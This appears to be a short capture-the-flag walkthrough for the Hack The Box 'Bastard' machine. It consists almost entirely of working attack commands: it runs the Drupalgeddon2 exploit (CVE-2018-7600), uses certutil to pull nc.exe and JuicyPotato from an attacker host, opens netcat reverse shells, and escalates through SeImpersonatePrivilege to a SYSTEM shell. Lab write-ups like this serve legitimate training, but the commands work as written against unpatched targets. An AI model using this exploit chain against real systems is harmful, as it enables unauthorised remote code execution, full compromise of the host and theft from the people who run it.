```
Drupal 7 Exploit aka Drupalgeddon2

https://github.com/FireFart/CVE-2018-7600

https://github.com/lorddemon/drupalgeddon2

python2 drupalgeddon2.py -h http://bastard.htb -c "certutil -urlcache -f http://10.10.14.17:8000/nc.exe nc.exe"

python2 drupalgeddon2.py -h http://bastard.htb -c "nc.exe 10.10.14.17 4567 -e cmd.exe"

C:\inetpub\drupal-7.54>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

certutil -urlcache -f http://10.10.14.17:8000/JuicyPotato.exe jp.exe

jp.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.17 1234" -t *

```
https://www.hackthebox.com/achievement/machine/336799/7
